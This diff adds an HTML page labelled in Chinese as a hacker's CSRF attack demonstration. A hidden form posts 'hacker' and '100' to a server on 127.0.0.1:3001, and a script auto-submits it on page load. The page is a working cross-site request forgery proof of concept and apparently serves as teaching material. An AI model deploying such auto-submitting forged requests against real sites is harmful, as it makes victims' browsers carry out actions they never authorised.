@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <h1>黑客的网站 CSRF攻击演示</h1>
+    <!--  -->
+    <h3>自动发起的POST请</h3>
+    <form
+      id="hacker-form"
+      action="http://127.0.0.1:3001"
+      method="POST"
+    >
+      <input type="hidden" name="userll" value="hacker" />
+      <input type="hidden" name="numberll" value="100" />
+    </form>
+    <script>
+      document.getElementById("hacker-form").submit();
+    </script>
+
+    <div>123123</div>
+  </body>
+</html>
